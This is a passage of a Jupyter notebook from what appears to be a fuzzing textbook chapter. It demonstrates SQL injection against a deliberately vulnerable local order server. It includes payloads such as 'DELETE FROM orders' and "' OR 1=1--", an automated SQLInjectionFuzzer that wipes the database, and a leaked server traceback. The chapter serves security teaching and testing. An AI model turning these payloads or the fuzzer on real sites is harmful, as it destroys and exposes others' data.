     "iopub.status.idle": "2021-12-13T14:45:36.687263Z",
     "shell.execute_reply": "2021-12-13T14:45:36.687708Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:36] INSERT INTO orders VALUES ('drill', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; --', 'j.doe@example.com', 'New York', '14083')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:36] \"GET /order?item=drill&name=Jane',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=j.doe%40example.com&city=New+York&zip=14083 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(urljoin(httpd_url, order_with_injected_sql))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "All orders are now gone:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.691487Z",
     "iopub.status.busy": "2021-12-13T14:45:36.690872Z",
     "iopub.status.idle": "2021-12-13T14:45:36.692956Z",
     "shell.execute_reply": "2021-12-13T14:45:36.693319Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This effect is also illustrated [in this very popular XKCD comic](https://xkcd.com/327/):"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "![https://xkcd.com/327/](PICS/xkcd_exploits_of_a_mom.png){width=100%}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Even if we had not been able to execute arbitrary commands, being able to compromise an orders database offers several possibilities for mischief.  For instance, we could use the address and matching credit card number of an existing person to go through validation and submit an order, only to have the order then delivered to an address of our choice.  We could also use SQL injection to inject HTML and JavaScript  code as above, bypassing possible sanitization geared at these domains."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To avoid such effects, the remedy is to _sanitize_ all third-party inputs – no character in the input must be interpretable as plain HTML, JavaScript, or SQL.  This is achieved by properly _quoting_ and _escaping_ inputs.  The [exercises](#Exercises) give some instructions on what to do."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Leaking Internal Information\n",
    "\n",
    "To craft the above SQL queries, we have used _insider information_ – for instance, we knew the name of the table as well as its structure.  Surely, an attacker would not know this and thus not be able to run the attack, right?  Unfortunately, it turns out we are leaking all of this information out to the world in the first place.  The error message produced by our server reveals everything we need:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 149,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.696784Z",
     "iopub.status.busy": "2021-12-13T14:45:36.696204Z",
     "iopub.status.idle": "2021-12-13T14:45:36.702451Z",
     "shell.execute_reply": "2021-12-13T14:45:36.702855Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "answer = webbrowser(urljoin(httpd_url, \"/order\"), mute=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 150,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.707100Z",
     "iopub.status.busy": "2021-12-13T14:45:36.706449Z",
     "iopub.status.idle": "2021-12-13T14:45:36.709013Z",
     "shell.execute_reply": "2021-12-13T14:45:36.709378Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'item'\n",
       "</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 150,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(answer)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The best way to avoid information leakage through failures is of course not to fail in the first place.  But if you fail, make it hard for the attacker to establish a link between the attack and the failure.  Do not produce \"internal error\" messages (and certainly not ones with internal information); do not become unresponsive; just go back to the home page and ask the user to supply correct data.  One more time, the [exercises](#Exercises) give some instructions on how to fix the server."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "If you can manipulate the server not only to alter information, but also to _retrieve_ information, you can learn about table names and structure by accessing special _tables_ (also called *data dictionary*) in which database servers store their metadata.  In the MySQL server, for instance, the special table `information_schema` holds metadata such as the names of databases and tables, data types of columns, or access privileges."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Fully Automatic Web Attacks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "So far, we have demonstrated the above attacks using our manually written order grammar.  However, the attacks also work for generated grammars.  We extend `HTMLGrammarMiner` by adding a number of common SQL injection attacks:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.715575Z",
     "iopub.status.busy": "2021-12-13T14:45:36.714913Z",
     "iopub.status.idle": "2021-12-13T14:45:36.716714Z",
     "shell.execute_reply": "2021-12-13T14:45:36.717095Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SQLInjectionGrammarMiner(HTMLGrammarMiner):\n",
    "    ATTACKS = [\n",
    "        \"<string>' <sql-values>); <sql-payload>; <sql-comment>\",\n",
    "        \"<string>' <sql-comment>\",\n",
    "        \"' OR 1=1<sql-comment>'\",\n",
    "        \"<number> OR 1=1\",\n",
    "    ]\n",
    "\n",
    "    def __init__(self, html_text, sql_payload):\n",
    "        super().__init__(html_text)\n",
    "\n",
    "        self.QUERY_GRAMMAR = extend_grammar(self.QUERY_GRAMMAR, {\n",
    "            \"<text>\": [\"<string>\", \"<sql-injection-attack>\"],\n",
    "            \"<number>\": [\"<digits>\", \"<sql-injection-attack>\"],\n",
    "            \"<checkbox>\": [\"<_checkbox>\", \"<sql-injection-attack>\"],\n",
    "            \"<email>\": [\"<_email>\", \"<sql-injection-attack>\"],\n",
    "            \"<sql-injection-attack>\": [\n",
    "                cgi_encode(attack, \"<->\") for attack in self.ATTACKS\n",
    "            ],\n",
    "            \"<sql-values>\": [\"\", cgi_encode(\"<sql-values>, '<string>'\", \"<->\")],\n",
    "            \"<sql-payload>\": [cgi_encode(sql_payload)],\n",
    "            \"<sql-comment>\": [\"--\", \"#\"],\n",
    "        })"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.721153Z",
     "iopub.status.busy": "2021-12-13T14:45:36.720587Z",
     "iopub.status.idle": "2021-12-13T14:45:36.722541Z",
     "shell.execute_reply": "2021-12-13T14:45:36.722980Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "html_miner = SQLInjectionGrammarMiner(\n",
    "    html_text, sql_payload=\"DROP TABLE orders\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.729090Z",
     "iopub.status.busy": "2021-12-13T14:45:36.728490Z",
     "iopub.status.idle": "2021-12-13T14:45:36.731059Z",
     "shell.execute_reply": "2021-12-13T14:45:36.731426Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'<start>': ['<action>?<query>'],\n",
       " '<string>': ['<letter>', '<letter><string>'],\n",
       " '<letter>': ['<plus>', '<percent>', '<other>'],\n",
       " '<plus>': ['+'],\n",
       " '<percent>': ['%<hexdigit-1><hexdigit>'],\n",
       " '<hexdigit>': ['0',\n",
       "  '1',\n",
       "  '2',\n",
       "  '3',\n",
       "  '4',\n",
       "  '5',\n",
       "  '6',\n",
       "  '7',\n",
       "  '8',\n",
       "  '9',\n",
       "  'a',\n",
       "  'b',\n",
       "  'c',\n",
       "  'd',\n",
       "  'e',\n",
       "  'f'],\n",
       " '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],\n",
       " '<text>': ['<string>', '<sql-injection-attack>'],\n",
       " '<number>': ['<digits>', '<sql-injection-attack>'],\n",
       " '<digits>': ['<digit>', '<digits><digit>'],\n",
       " '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],\n",
       " '<checkbox>': ['<_checkbox>', '<sql-injection-attack>'],\n",
       " '<_checkbox>': ['on', 'off'],\n",
       " '<email>': ['<_email>', '<sql-injection-attack>'],\n",
       " '<_email>': ['<string>%40<string>'],\n",
       " '<hexdigit-1>': ['3', '4', '5', '6', '7'],\n",
       " '<submit>': [''],\n",
       " '<sql-injection-attack>': [\"<string>'+<sql-values>)%3b+<sql-payload>%3b+<sql-comment>\",\n",
       "  \"<string>'+<sql-comment>\",\n",
       "  \"'+OR+1%3d1<sql-comment>'\",\n",
       "  '<number>+OR+1%3d1'],\n",
       " '<sql-values>': ['', \"<sql-values>,+'<string>'\"],\n",
       " '<sql-payload>': ['DROP+TABLE+orders'],\n",
       " '<sql-comment>': ['--', '#'],\n",
       " '<action>': ['/order'],\n",
       " '<item>': ['item=<item-value>'],\n",
       " '<item-value>': ['tshirt', 'drill', 'lockset'],\n",
       " '<name>': ['name=<text>'],\n",
       " '<email-1>': ['email=<email>'],\n",
       " '<city>': ['city=<text>'],\n",
       " '<zip>': ['zip=<number>'],\n",
       " '<terms>': ['terms=<checkbox>'],\n",
       " '<submit-1>': ['submit=<submit>'],\n",
       " '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}"
      ]
     },
     "execution_count": 153,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar = html_miner.mine_grammar()\n",
    "grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 154,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.735576Z",
     "iopub.status.busy": "2021-12-13T14:45:36.734879Z",
     "iopub.status.idle": "2021-12-13T14:45:36.737372Z",
     "shell.execute_reply": "2021-12-13T14:45:36.737850Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<string>', '<sql-injection-attack>']"
      ]
     },
     "execution_count": 154,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<text>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We see that several fields now are tested for vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.747673Z",
     "iopub.status.busy": "2021-12-13T14:45:36.747097Z",
     "iopub.status.idle": "2021-12-13T14:45:36.749525Z",
     "shell.execute_reply": "2021-12-13T14:45:36.749936Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/order?item=lockset&name=4+OR+1%3d1&email=%66%40%3ba&city=%7a&zip=99&terms=1'+#&submit=\""
      ]
     },
     "execution_count": 155,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_fuzzer = GrammarFuzzer(grammar)\n",
    "sql_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.753554Z",
     "iopub.status.busy": "2021-12-13T14:45:36.752846Z",
     "iopub.status.idle": "2021-12-13T14:45:36.755438Z",
     "shell.execute_reply": "2021-12-13T14:45:36.755815Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.759844Z",
     "iopub.status.busy": "2021-12-13T14:45:36.759298Z",
     "iopub.status.idle": "2021-12-13T14:45:36.770120Z",
     "shell.execute_reply": "2021-12-13T14:45:36.770500Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:36] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:36] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(urljoin(httpd_url,\n",
    "                              \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.774717Z",
     "iopub.status.busy": "2021-12-13T14:45:36.774141Z",
     "iopub.status.idle": "2021-12-13T14:45:36.775661Z",
     "shell.execute_reply": "2021-12-13T14:45:36.776060Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def orders_db_is_empty():\n",
    "    try:\n",
    "        entries = db.execute(\"SELECT * FROM orders\").fetchall()\n",
    "    except sqlite3.OperationalError:\n",
    "        return True\n",
    "    return len(entries) == 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.779333Z",
     "iopub.status.busy": "2021-12-13T14:45:36.778486Z",
     "iopub.status.idle": "2021-12-13T14:45:36.781607Z",
     "shell.execute_reply": "2021-12-13T14:45:36.781982Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 159,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "orders_db_is_empty()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.786436Z",
     "iopub.status.busy": "2021-12-13T14:45:36.785867Z",
     "iopub.status.idle": "2021-12-13T14:45:36.787878Z",
     "shell.execute_reply": "2021-12-13T14:45:36.788336Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SQLInjectionFuzzer(WebFormFuzzer):\n",
    "    def __init__(self, url, sql_payload=\"\", **kwargs):\n",
    "        self.sql_payload = sql_payload\n",
    "        super().__init__(url, **kwargs)\n",
    "\n",
    "    def get_grammar(self, html_text):\n",
    "        grammar_miner = SQLInjectionGrammarMiner(\n",
    "            html_text, sql_payload=self.sql_payload)\n",
    "        return grammar_miner.mine_grammar()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.792651Z",
     "iopub.status.busy": "2021-12-13T14:45:36.792022Z",
     "iopub.status.idle": "2021-12-13T14:45:37.429090Z",
     "shell.execute_reply": "2021-12-13T14:45:37.429468Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n",
    "web_runner = WebRunner(httpd_url)\n",
    "trials = 1\n",
    "\n",
    "while True:\n",
    "    sql_fuzzer.run(web_runner)\n",
    "    if orders_db_is_empty():\n",
    "        break\n",
    "    trials += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 162,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.433394Z",
     "iopub.status.busy": "2021-12-13T14:45:37.432784Z",
     "iopub.status.idle": "2021-12-13T14:45:37.435055Z",
     "shell.execute_reply": "2021-12-13T14:45:37.435420Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "68"
      ]
     },
     "execution_count": 162,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "trials"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Our attack was successful! After less than a second of testing, our database is empty:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 163,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.438746Z",
     "iopub.status.busy": "2021-12-13T14:45:37.438185Z",
     "iopub.status.idle": "2021-12-13T14:45:37.440437Z",
     "shell.execute_reply": "2021-12-13T14:45:37.440853Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 163,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "orders_db_is_empty()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Again, note the level of possible automation: We can\n",
    "\n",
    "* Crawl the Web pages of a host for possible forms\n",
    "* Automatically identify form fields and possible values\n",
    "* Inject SQL (or HTML, or JavaScript) into any of these fields\n",
    "\n",
    "and all of this fully automatically, not needing anything but the URL of the site."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The bad news is that with a tool set as the above, anyone can attack web sites.  The even worse news is that such penetration tests take place every day, on every web site.  The good news, though, is that after reading this chapter, you now get an idea of how Web servers are attacked every day – and what you as a Web server maintainer could and should do to prevent this."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Synopsis\n",
    "\n",
    "This chapter provides a simple (and vulnerable) Web server and two experimental fuzzers that are applied to it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Fuzzing Web Forms\n",
    "\n",
    "`WebFormFuzzer` demonstrates how to interact with a Web form.  Given a URL with a Web form, it automatically extracts a grammar that produces a URL; this URL contains values for all form elements.  Support is limited to GET forms and a subset of HTML form elements."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Here's the grammar extracted for our vulnerable Web server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 164,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.444711Z",
     "iopub.status.busy": "2021-12-13T14:45:37.444171Z",
     "iopub.status.idle": "2021-12-13T14:45:37.450440Z",
     "shell.execute_reply": "2021-12-13T14:45:37.450871Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "web_form_fuzzer = WebFormFuzzer(httpd_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 165,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.455032Z",
     "iopub.status.busy": "2021-12-13T14:45:37.454403Z",
     "iopub.status.idle": "2021-12-13T14:45:37.456868Z",
     "shell.execute_reply": "2021-12-13T14:45:37.457299Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<action>?<query>']"
      ]
     },
     "execution_count": 165,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.grammar['<start>']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.461268Z",
     "iopub.status.busy": "2021-12-13T14:45:37.460692Z",
     "iopub.status.idle": "2021-12-13T14:45:37.463318Z",
     "shell.execute_reply": "2021-12-13T14:45:37.463905Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order']"
      ]
     },
     "execution_count": 166,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.grammar['<action>']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.467954Z",
     "iopub.status.busy": "2021-12-13T14:45:37.467352Z",
     "iopub.status.idle": "2021-12-13T14:45:37.469733Z",
     "shell.execute_reply": "2021-12-13T14:45:37.470099Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']"
      ]
     },
     "execution_count": 167,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.grammar['<query>']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Using it for fuzzing yields a path with all form values filled; accessing this path acts like filling out and submitting the form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.480308Z",
     "iopub.status.busy": "2021-12-13T14:45:37.479776Z",
     "iopub.status.idle": "2021-12-13T14:45:37.482311Z",
     "shell.execute_reply": "2021-12-13T14:45:37.482754Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=lockset&name=%43+&email=+c%40_+c&city=%37b_4&zip=5&terms=on&submit='"
      ]
     },
     "execution_count": 168,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Repeated calls to `WebFormFuzzer.fuzz()` invoke the form again and again, each time with different (fuzzed) values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### SQL Injection Attacks\n",
    "\n",
    "`SQLInjectionFuzzer` is an experimental extension of `WebFormFuzzer` whose constructor takes an additional _payload_ – an SQL command to be injected and executed on the server.  Otherwise, it is used like `WebFormFuzzer`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.486706Z",
     "iopub.status.busy": "2021-12-13T14:45:37.485644Z",
     "iopub.status.idle": "2021-12-13T14:45:37.498650Z",
     "shell.execute_reply": "2021-12-13T14:45:37.498095Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/order?item=lockset&name=+&email=0%404&city=+'+)%3b+DELETE+FROM+orders%3b+--&zip='+OR+1%3d1--'&terms=on&submit=\""
      ]
     },
     "execution_count": 169,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_fuzzer = SQLInjectionFuzzer(httpd_url, \"DELETE FROM orders\")\n",
    "sql_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "As you can see, the path to be retrieved contains the payload encoded into one of the form field values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "`SQLInjectionFuzzer` is a proof-of-concept on how to build a malicious fuzzer; you should study and extend its code to make actual use of it."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": true,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Lessons Learned\n",
    "\n",
    "* User Interfaces (in the Web and elsewhere) should be tested with _expected_ and _unexpected_ values.\n",
    "* One can _mine grammars from user interfaces_, allowing for their widespread testing.\n",
    "* Consequent _sanitizing_ of inputs prevents common attacks such as code and SQL injection.\n",
    "* Do not attempt to write a Web server yourself, as you are likely to repeat all the mistakes of others."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We're done, so we can clean up:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.502094Z",
     "iopub.status.busy": "2021-12-13T14:45:37.501575Z",
     "iopub.status.idle": "2021-12-13T14:45:37.509325Z",
     "shell.execute_reply": "2021-12-13T14:45:37.509939Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "clear_httpd_messages()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 171,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:37.514262Z",
     "iopub.status.busy": "2021-12-13T14:45:37.513545Z",
     "iopub.status.idle": "2021-12-13T14:45:37.515865Z",
     "shell.execute_reply": "2021-12-13T14:45:37.516321Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "httpd_process.terminate()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Next Steps\n",
    "\n",
    "From here, the next step is [GUI Fuzzing](GUIFuzzer.ipynb), going from HTML- and Web-based user interfaces to generic user interfaces (including JavaScript and mobile user interfaces).\n",
    "\n",
    "If you are interested in security testing, do not miss our [chapter on information flow](InformationFlow.ipynb), showing how to systematically detect information leaks; this also addresses the issue of SQL Injection attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Background\n",
    "\n",
    "The [Wikipedia pages on Web application security](https://en.wikipedia.org/wiki/Web_application_security) are a mandatory read for anyone building, maintaining, or testing Web applications.  In 2012, cross-site scripting and SQL injection, as discussed in this chapter, made up more than 50% of Web application vulnerabilities.\n",
    "\n",
    "The [Wikipedia page on penetration testing](https://en.wikipedia.org/wiki/Penetration_test) provides a comprehensive overview on the history of penetration testing, as well as collections of vulnerabilities.\n",
    "\n",
    "The [OWASP Zed Attack Proxy Project](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (ZAP) is an open source Web site security scanner including several of the features discussed above, and many many more."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": true,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Exercises"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "button": false,
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Exercise 1: Fix the Server\n",
    "\n",
